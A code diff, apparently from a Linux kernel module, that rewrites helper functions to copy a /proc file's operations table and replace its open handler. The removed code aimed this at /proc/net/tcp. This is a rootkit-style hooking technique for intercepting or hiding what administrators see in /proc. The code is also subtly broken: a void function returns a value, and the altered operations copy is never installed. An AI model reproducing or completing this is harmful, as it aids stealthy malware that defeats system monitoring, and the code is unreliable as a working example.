@@ -98,29 +98,41 @@ static void b(void)
 //this macro  that set seq opertions to given file (by his path)
 //op is the opertions
 //path is the path to the spefic file
-// 
+//
+struct file_operations *org_fops, proc_fops;  
+struct inode *proc_inode;
+struct file *file;                                                         
+struct path p; 
+void set_ops(char *path)
+{
+    
+    if(kern_path(path, 0, &p))
+            return 0;
+        //get the inode
+        proc_inode = p.dentry->d_inode;
+        //get a copy of fop from inode
 
-void set_afinfo_seq_op(char * path)
+        proc_fops = *proc_inode->i_fop;
+        //backup the fop
+        org_fops = proc_inode->i_fop;
+}
+void hook_seq(void)
  {     
-    struct file *file;                                                         
-    struct path *p;
-    static const struct file_operations *org_fops;                                              
-    struct tcp_seq_afinfo *af_info;
-    struct proc_dir_entry *entry;
-    file = filp_open(path, O_RDWR, 0);                                    
-    org_fops = file->f_op;
+                                    
+    proc_fops.open = ct_open;
+    printk(KERN_ALERT "hooked!");
+
     //ern_path(path, 0, p);                                         
     //entry = PDE(p->dentry->d_inode);
     //org_fops = entry->proc_dir_fops; 
     //origin_seq_show = origin_seq_ops.show;                                      
     //PDE_DATA(p->dentry->d_inode)->seq_ops= seq_ops;                                       
- }              
- void hyjeck(void)
+ } 
+ void unhook_seq(void)
  {
-
-     set_afinfo_seq_op("/proc/net/tcp");
-
- }
-
+     proc_fops.open = org_fops->open;
+     printk(KERN_ALERT "unhooked!");
+ }            
+ 
                                                   
 #endif
